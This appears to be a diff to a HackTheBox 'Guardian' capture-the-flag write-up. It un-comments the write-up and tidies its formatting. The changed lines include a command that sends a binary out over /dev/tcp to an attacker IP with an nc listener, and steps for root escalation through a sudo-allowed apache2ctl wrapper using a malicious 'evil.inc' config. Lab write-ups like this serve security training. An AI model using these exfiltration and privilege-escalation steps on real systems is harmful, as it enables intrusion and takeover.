@@ -10,7 +10,6 @@ Hints: True
 This challenge is currently active on HackTheBox.
 In accordance with HackTheBox's content policy, this writeup will be made publicly available only after the challenge is retired.**
 
-<!--
 
 
 ### 🏁 Summary of Attack Chain
@@ -248,11 +247,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
 <body class="bg-gray-100">
     <div class="sidebar">
-        <!-- Include Admin Sidebar -->
+       
         <?php include '../includes/admin/sidebar.php'; ?>
     </div>
 
-    <!-- Main Content -->
+    
     <div class="main-content">
         <nav class="bg-white shadow-sm">
             <div class="mx-6 py-4">
@@ -602,7 +601,7 @@ Matching Defaults entries for mark on guardian:
 
 User mark may run the following commands on guardian:
     (ALL) NOPASSWD: /usr/local/bin/safeapache2ctl
-    ```
+```
 ![Owned_Mark](Pictures/htb_guardian_sudol_mark.png)
 
 Get it out and decompile it
@@ -610,6 +609,7 @@ Get it out and decompile it
 ```
 mark@guardian:~$ cat /usr/local/bin/safeapache2ctl > /dev/tcp/10.10.XX.XX/8888
 ```
+
 ```
  nc -lvnp 8888 > safeapache2ctl                 
 listening on [any] 8888 ...
@@ -635,7 +635,7 @@ After gaining access as `mark`, the final step is to escalate to `root`. Running
 
    
 
-   <!-- end list -->
+  
 
    ```bash
    cat << 'EOF' > /home/mark/confs/run.sh
@@ -647,7 +647,7 @@ After gaining access as `mark`, the final step is to escalate to `root`. Running
 
    * Create a new Apache configuration file (`evil.inc`) in `/home/mark/confs/` that executes your script.
 ![Exploitation](Pictures/htb_guardian_Root_logic_priv.png)
-   <!-- end list -->
+
 
    ```bash
    cat << EOF > /home/mark/confs/evil.inc
@@ -659,7 +659,7 @@ After gaining access as `mark`, the final step is to escalate to `root`. Running
 
    * Create the main Apache configuration file (`exploit.conf`) that includes your malicious file.
 
-   <!-- end list -->
+ 
 
    ```bash
    echo "Include /home/mark/confs/evil.inc" > /home/mark/confs/exploit.conf
@@ -667,7 +667,6 @@ After gaining access as `mark`, the final step is to escalate to `root`. Running
 
    * Execute the binary with `sudo` to load your configuration file.
 
-   <!-- end list -->
 
    ```bash
    sudo /usr/local/bin/safeapache2ctl -f /home/mark/confs/exploit.conf
@@ -689,5 +688,3 @@ After gaining access as `mark`, the final step is to escalate to `root`. Running
 ---
 
 **Pwned! Guradian**
-
--->
